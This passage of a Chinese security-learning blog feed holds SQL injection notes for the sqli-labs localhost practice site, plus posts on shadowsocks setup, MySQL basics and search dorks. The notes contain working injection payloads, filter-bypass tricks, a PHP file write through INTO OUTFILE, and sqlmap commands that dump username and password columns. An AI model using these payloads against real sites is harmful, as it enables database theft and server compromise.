class="line">asciii(stustr(database(),1,1))=N</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "注入点" --technique T --dbs</span><br></pre></td></tr></table></figure><blockquote><p>注解： T 基于时间 （sqlmap -h/hh 查询详细）</p><p>Techniques:<br> These options can be used to tweak testing of specific SQL     injection<br> techniques</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> --technique=TECH    SQL injection techniques to use (default <span class="string">"BEUSTQ"</span>)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p><p>默认情况下会测试所有的方式，可选择</p></blockquote><h3 id="mysql读写文件："><a href="#mysql读写文件：" class="headerlink" title="mysql读写文件："></a>mysql读写文件：</h3><p>读：</p><blockquote><p>前提：show global variables like “secure_file_priv”;</p><p><img src="%5Cimages%5Cmysqld_secure_file_priv.png" alt></p><p>修改my.ini </p><p><img src="%5Cimages%5Cnull.png" alt></p><p><img src="%5Cimages%5Cnull_no.png" alt></p><p>重启phpstudy.</p><p>select load_file(“f:\1.txt”)；</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(f:www\\Less-7\\flag.txt),3 --+</span><br></pre></td></tr></table></figure><p>写：</p><blockquote><p>前提：show variables like ‘%general%’;</p><p><img src="%5Cimages%5Cwrite-1.png" alt></p><p>查看其general_log 是否为 OFF。</p><p>若是，则修改为 on 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; set global general_log = on;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><img src="%5Cimages%5Cwrite_yes.png" alt></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &quot;f:www\\Less-7\\1.php&quot; --+</span><br><span class="line"></span><br><span class="line">127.0.0.1\Less-7\1.php #查看是否写入成功</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -hh</span><br><span class="line">sqlmap -u "注入点" --file-read "文件路经"</span><br><span class="line"> --file-write</span><br><span class="line"> --file-dest</span><br></pre></td></tr></table></figure><h3 id="post-基于报错"><a href="#post-基于报错" class="headerlink" title="post 基于报错"></a>post 基于报错</h3><blockquote><p>get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。</p></blockquote><p><code>burpsuite</code></p><p>burpsuite 抓取http数据包保存在文件中</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 文件路径 -p 指定探测参数</span><br></pre></td></tr></table></figure><h3 id="get报错注入-未完善"><a href="#get报错注入-未完善" class="headerlink" title="get报错注入(未完善)"></a>get报错注入(未完善)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 011011</p></blockquote><h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><p>大小写，编码，关键字屏蔽，内联注释</p><h3 id="post-基于时间和布尔值的盲注"><a href="#post-基于时间和布尔值的盲注" class="headerlink" title="post 基于时间和布尔值的盲注"></a>post 基于时间和布尔值的盲注</h3><p><code>burpsuite</code>抓取http报文</p><p>时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ </p><p>布尔：… and (lenght (database() )&gt;5) –+</p><p><code>sqlmap</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">时间 ： sqlmap -r "文件路径" -p  参数   --technique T </span><br><span class="line">布尔：   sqlmap -r "文件路径" -p  参数   --technique B</span><br></pre></td></tr></table></figure><h3 id="http头中的注入"><a href="#http头中的注入" class="headerlink" title="http头中的注入"></a>http头中的注入</h3><p>在user-agent 和 referer 未被屏蔽时，可以进行注入</p><p><code>burpsuite</code></p><p>user-agent: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1</span><br></pre></td></tr></table></figure><p>referer:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1</span><br></pre></td></tr></table></figure><h3 id="post-update语句的注入"><a href="#post-update语句的注入" class="headerlink" title="post_update语句的注入"></a>post_update语句的注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。</p></blockquote><p>updatexml和extractvalue函数</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>例：less-20</p><p><code>burpsuite</code></p><p>抓取，用” \ “判断闭合符号，之后 and 1=1,或 and \ or 加sql语句</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --dbs</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security --tables</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users --columns </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p><code>burpsuite</code></p><p>首先截取，decoder 进行加密，例如：admin\ base64加密后为：YWRtaW5c</p><p>进行报错。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h3 id="绕过去除注释的sql注入"><a href="#绕过去除注释的sql注入" class="headerlink" title="绕过去除注释的sql注入"></a>绕过去除注释的sql注入</h3><p>注释符：  –+   –空格    #   /* 多行注释 */</p><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>例：less-23:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br></pre></td></tr></table></figure><p> 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-23/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><p>…</p><h3 id="绕过去除and-or-的sql注入"><a href="#绕过去除and-or-的sql注入" class="headerlink" title="绕过去除and or 的sql注入"></a>绕过去除and or 的sql注入</h3><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-25/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="绕过去除空格的sql注入"><a href="#绕过去除空格的sql注入" class="headerlink" title="绕过去除空格的sql注入"></a>绕过去除空格的sql注入</h3><p>%09 :Tab </p><p>%0a ：换行</p><p>%20 ：空格 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-27/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="宽字节的注入"><a href="#宽字节的注入" class="headerlink" title="宽字节的注入"></a>宽字节的注入</h3><p>原理： GBK ：宽字节字符集的一种，Mysql默认字符集,</p><p>GBK占二字节，ASCII占一字节</p><p>php中编码为GBK，函数执行添加的是ASCII编码</p><p>%DF (常用)：会被php 中的addslashes 函数转义为” %DF\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-33/?id=1%df%27" --search --level 3 --risk 1 --thread 10</span><br></pre></td></tr></table></figure><p>其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可；</p><p>GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-32/?id=1" --tamper=unmagicquotes.py</span><br></pre></td></tr></table></figure><h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a>Access偏移注入</h3><p>公式：</p><p>工具：owasp-zap</p><p>access:小型数据库，只存在一个库，库内多个表。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建ss服务</title>
      <link href="/2019/05/13/%E6%90%AD%E5%BB%BAss%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/05/13/%E6%90%AD%E5%BB%BAss%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<ul><li>在centos 7上搭建ss服务</li></ul><a id="more"></a><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装:"></a>下载安装:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install python-setuptools &amp;&amp; easy_install pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "server": "vps ip",</span><br><span class="line">    "port_password": &#123;</span><br><span class="line">        "端口": "密码",</span><br><span class="line">        "端口": "密码"</span><br><span class="line">    &#125;,</span><br><span class="line">    "timeout": 300,</span><br><span class="line">    "method": "aes-256-cfb"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>port_password</strong>可以配置多账号,每行代表一个<code>端口:密码</code></p><p>前台运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><p>后台运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><p>停止后台运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d stop</span><br></pre></td></tr></table></figure><p>查看运行日志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f -n 100 /var/log/shadowsocks.log</span><br></pre></td></tr></table></figure><h3 id="安装加速插件"><a href="#安装加速插件" class="headerlink" title="安装加速插件:"></a>安装加速插件:</h3><p><strong>谷歌BBR加速教程</strong></p><p><strong>vultr服务器的centos6不支持bbr加速，但centos7系统支持bbr加速，所以如果你想用bbr加速教程，vps操作系统需要选择centos7或其它系统。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh</span><br><span class="line"></span><br><span class="line">chmod +x bbr.sh</span><br><span class="line"></span><br><span class="line">./bbr.sh</span><br></pre></td></tr></table></figure><p><img src="source%5Cimages%5Css01.jpg" alt></p><p><img src="source%5Cimages%5Css02.png" alt></p><p>正在重启,莫慌,重连即可!</p><p>输入命令<code>lsmod | grep bbr</code> 如果出现<strong>tcp_bbr</strong>字样表示bbr已安装并启动成功</p><p><strong>注</strong>:因为是重启啦,所以还要启动一下ss服务</p><p>后台运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><h3 id="centos7防火墙配置"><a href="#centos7防火墙配置" class="headerlink" title="centos7防火墙配置:"></a>centos7防火墙配置:</h3><p><strong>查看firewall服务状态</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><p><strong>查看firewall的状态</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure><p><strong>查询,开放,关闭端口</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --query-port=8080/tcp# 查询端口是否开放</span><br><span class="line"></span><br><span class="line">firewall-cmd --permanent --add-port=80/tcp# 开放80端口</span><br><span class="line"></span><br><span class="line">firewall-cmd --permanent --remove-port=8080/tcp# 移除端口</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">重启防火墙(修改配置后要重启防火墙)</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数解释</span></span><br><span class="line">1、firwall-cmd：是Linux提供的操作firewall的一个工具；</span><br><span class="line">2、--permanent：表示设置为持久；</span><br><span class="line">3、--add-port：标识添加的端口；</span><br></pre></td></tr></table></figure><p><strong>查看防火墙规则</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-all</span><br></pre></td></tr></table></figure><p><strong>开启、重启、关闭、firewalld.service服务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service firewalld start# 开启</span><br><span class="line"></span><br><span class="line">service firewalld restart# 重启</span><br><span class="line"></span><br><span class="line">service firewalld stop# 关闭</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable firewalld.service#关闭开机启动：</span><br><span class="line"></span><br><span class="line">systemctl enable firewalld.service#开启开机启动：</span><br></pre></td></tr></table></figure><blockquote><p>参考链接:</p><p><del>vultr vps购买</del></p><p><del><a href="https://my.vultr.com/" target="_blank" rel="noopener">https://my.vultr.com</a></del></p><p>vps 自己选择（此处不做推荐）</p><p>搭建ss ,安装bbr</p><p><a href="https://yq.aliyun.com/articles/94632" target="_blank" rel="noopener">https://yq.aliyun.com/articles/94632</a></p><p><a href="https://github.com/Alvin9999/new-pac/wiki/自建ss服务器教程" target="_blank" rel="noopener">https://github.com/Alvin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B</a></p><p>防火墙规则</p><p><a href="https://www.cnblogs.com/xxoome/p/7115614.html" target="_blank" rel="noopener">https://www.cnblogs.com/xxoome/p/7115614.html</a></p><p><a href="https://blog.csdn.net/wsh_0703/article/details/80279115/" target="_blank" rel="noopener">https://blog.csdn.net/wsh_0703/article/details/80279115/</a>/</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> vps </tag>
            
            <tag> ss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql基础语句</title>
      <link href="/2019/05/04/mysql%E5%9F%BA%E7%A1%80%E8%AF%AD%E5%8F%A5/"/>
      <url>/2019/05/04/mysql%E5%9F%BA%E7%A1%80%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>交换型数据库，mysql,sqlserver,orical…</li></ul><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#数据库</span><br><span class="line">show databases;</span><br><span class="line">create database test1;</span><br><span class="line">drop database test1;</span><br><span class="line">use test1;</span><br><span class="line">select database();</span><br><span class="line"></span><br><span class="line">#表</span><br><span class="line">create table users(</span><br><span class="line">id int(10) AUTO_INCREMENT,</span><br><span class="line">name varchar(50) not null,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br><span class="line">show tables;</span><br><span class="line">desc users;</span><br><span class="line">alter table users change name username varchar(50) not null;</span><br><span class="line"></span><br><span class="line">#增删改查</span><br><span class="line">insert into users values (1,&quot;Wang&quot;);</span><br><span class="line">insert into users values (2,&quot;Tian&quot;);</span><br><span class="line">insert into users values (3,&quot;Liu&quot;);</span><br><span class="line">insert into users values (4,&quot;Li&quot;);</span><br><span class="line">select * from users;</span><br><span class="line">delete from users where usersname=&quot;Liu&quot;;</span><br><span class="line">update users set id=2 where id=3;</span><br><span class="line"></span><br><span class="line">#函数</span><br><span class="line">select user();</span><br><span class="line">select database();</span><br><span class="line">select version();</span><br><span class="line"></span><br><span class="line">select load_file(&quot;路径/filename&quot;);</span><br><span class="line">show variables like &quot;secure_file_priv&quot;</span><br><span class="line">版本5.0之前没有，5.5之后出现NULL</span><br><span class="line">win下修改mysql下的my.ini</span><br><span class="line">[mysqld]下加 secure_file_priv= #对mysqld，不限制导入导出</span><br><span class="line">[mysqld]下加 secure_file_priv=/tmp/ #对mysqld，在tmp目录下不限制导入导出</span><br><span class="line">[mysqld]下加 secure_file_priv=null #对mysqld，限制导入导出</span><br><span class="line">重启mysql</span><br><span class="line">Linux下修改 /etc/mysql/mysql.conf.d</span><br><span class="line">添加 secure_file_priv=&quot;/&quot;</span><br><span class="line">select &quot;hello man!&quot; into dampfile &quot;路经/filename&quot;; #outfile导入多行</span><br><span class="line"></span><br><span class="line">#退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建web服务</title>
      <link href="/2019/05/03/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/05/03/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>多种方式部署web服务</p></blockquote><a id="more"></a><p>静态网站：html<br>动态网站： 与数据库交互,jsp,php,asp…<br>伪静态网站：</p><hr><p>在服务器上搭建多个网站：不同的IP或端口或域名即可，设置域名后，需要安装DNS服务器。</p><blockquote><p>windows+iis+asp+assess<br>windows+iss+asp+mssql<br>windows+asp小旋风+asp+assess<br>windows+apmserv+php+mysql<br>windows+tomcat+jsp+mysql<br>linux+apche+php+mysql</p></blockquote><h3 id="windows-iis-asp-assess"><a href="#windows-iis-asp-assess" class="headerlink" title="windows+iis+asp+assess"></a>windows+iis+asp+assess</h3><p>服务器管理器-&gt;添加角色-&gt;web服务器（IIS）-&gt;安装完成<br>添加网站，编辑权限AuthenticatedUsers 完全控制，asp启用父目录，布置完成！</p><h3 id="windows-asp小旋风-asp-assess"><a href="#windows-asp小旋风-asp-assess" class="headerlink" title="windows+asp小旋风+asp+assess"></a>windows+asp小旋风+asp+assess</h3><h3 id="windows-apmserv-php-mysql"><a href="#windows-apmserv-php-mysql" class="headerlink" title="windows+apmserv+php+mysql"></a>windows+apmserv+php+mysql</h3><p>下载apmserv…</p><p>安装服务iis dhcp dns</p>]]></content>
      
      
      
        <tags>
            
            <tag> web服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更换Linux系统</title>
      <link href="/2019/05/03/%E6%9B%B4%E6%8D%A2Linux%E7%B3%BB%E7%BB%9F/"/>
      <url>/2019/05/03/%E6%9B%B4%E6%8D%A2Linux%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。</p></blockquote><a id="more"></a><h2 id="更换为Linux系统遇到的问题"><a href="#更换为Linux系统遇到的问题" class="headerlink" title="更换为Linux系统遇到的问题"></a>更换为Linux系统遇到的问题</h2><h3 id="问题1：无线网卡无法打开"><a href="#问题1：无线网卡无法打开" class="headerlink" title="问题1：无线网卡无法打开"></a>问题1：无线网卡无法打开</h3><p>首先通过命令查看网卡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfkill list all</span><br></pre></td></tr></table></figure><p>会显示出 ideapad* 的软件开，硬件关；所以我们关闭它，留下软硬件皆开的。</p><p>移出ideapad无线模块：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe -r ideapad_laptop</span><br></pre></td></tr></table></figure><p> 写配置文件，开机关闭ideapad无线模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/modprobe.d/ideapad.conf</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/ideapad.conf</span><br></pre></td></tr></table></figure><p>写入 <code>blacklist ideapad_laptop</code></p><p>如果信号易断，可下载安装无线网卡驱动，下命令可查看无线网卡型号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep Wireless</span><br></pre></td></tr></table></figure><p><a href="https://github.com/lwfinger/rtlwifi_new" target="_blank" rel="noopener">无线网卡驱动下载地址</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make &amp; make install</span><br></pre></td></tr></table></figure><p><code>enjoy</code>!</p><h3 id="问题2：锁屏界面输入密码无法进入桌面"><a href="#问题2：锁屏界面输入密码无法进入桌面" class="headerlink" title="问题2：锁屏界面输入密码无法进入桌面"></a>问题2：锁屏界面输入密码无法进入桌面</h3><p>原因是因为N卡，禁用即可<br><a href="https://blog.csdn.net/lyfmxy/article/details/53533948" target="_blank" rel="noopener">转载</a></p><h3 id="问题3：制作的启动盘，无法载入"><a href="#问题3：制作的启动盘，无法载入" class="headerlink" title="问题3：制作的启动盘，无法载入"></a>问题3：制作的启动盘，无法载入</h3><p>用这个制作做启动盘<br><strong>Win32DiskImager</strong></p><p><a href="https://www.lanzous.com/i41wx1g" target="_blank" rel="noopener">网盘下载地址</a></p><h3 id="问题4：分区"><a href="#问题4：分区" class="headerlink" title="问题4：分区"></a>问题4：分区</h3><p>这个不是问题，多看看书，不然用Linux会很难受。<br>新手建议全部给“/”；<br>另外EFI是在UEFI模式下必须要有的分区，给个默认大小分区；<br>两个可以了，会分区的不用看这里。<br>ntfs,建议你的系统盘之外的盘，采用这个文件系统格式<br>系统盘就ext4吧</p><p><strong>enjoy!</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索引擎这么用</title>
      <link href="/2019/05/03/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%BF%99%E4%B9%88%E7%94%A8/"/>
      <url>/2019/05/03/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%BF%99%E4%B9%88%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搜索引擎这么用，更快捷的查询你想要的内容</p></blockquote><a id="more"></a><table><thead><tr><th>关键字</th><th>含义</th></tr></thead><tbody><tr><td>site</td><td>指定搜索域名（例：site:baidi.com）</td></tr><tr><td>inurl</td><td>指定url中是否含有某些关键字（例：inurl:.php?id=）</td></tr><tr><td>intext</td><td>指定网页中是否含有某些关键字(例：intext:网站管理)</td></tr><tr><td>filetype</td><td>指定搜索文件类型（例：filetype:txt）</td></tr><tr><td>intitle</td><td>指定网页标题是否含有某些关键字（例：intitle:后台管理）</td></tr><tr><td>link</td><td>指定网页链接（例：link:baidu.com 指定与百度做了外链的站点）</td></tr><tr><td>info</td><td>指定搜索网页信息</td></tr></tbody></table><blockquote><p><a href="http://sec-redclub.com/archives/116/" target="_blank" rel="noopener">http://sec-redclub.com/archives/116/</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arpspoof工具</title>
      <link href="/2019/05/03/arpspoof%E5%B7%A5%E5%85%B7/"/>
      <url>/2019/05/03/arpspoof%E5%B7%A5%E5%85%B7/</url>
      
